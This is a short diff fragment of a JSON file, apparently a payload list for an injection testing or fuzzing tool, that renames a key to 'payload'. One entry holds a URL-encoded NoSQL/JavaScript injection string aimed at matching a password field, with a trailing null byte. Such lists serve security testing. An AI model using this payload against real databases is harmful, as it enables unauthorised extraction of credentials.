@@ -1,5 +1,5 @@
 {
-  "req": [
+  "payload": [
     {
       "BODY": "''%20%26%26%20this.passwordzz.match(/.*/)//+%00",
       "ENCODE": "Base64 UTF-16",
